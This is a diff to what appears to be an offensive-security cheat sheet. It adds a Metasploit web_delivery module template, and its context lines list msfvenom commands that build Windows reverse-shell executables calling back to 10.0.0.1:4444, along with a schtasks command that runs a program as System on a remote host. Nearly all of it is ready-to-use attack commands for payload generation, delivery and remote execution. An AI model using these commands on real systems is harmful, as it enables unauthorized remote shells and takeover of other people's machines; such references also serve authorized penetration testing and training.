@@ -541,6 +541,16 @@ Netcat ASP reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=
 Netcat reverse shell (unstaged): `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe`\
 Netcat reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe`\
 
+### Metasploit delivery methods:
+```
+use exploit/multi/script/web_delivery
+show targets
+set payload ???
+set SRVHOST ???
+set URIPATH /
+run
+```
+
 ### Windows scheduled task
 ```
 schtasks /Create /tn ExampleTask /TR c:\windows\system32\calc.exe /SC once /ST 00:00 /S target.host.domain /RU System
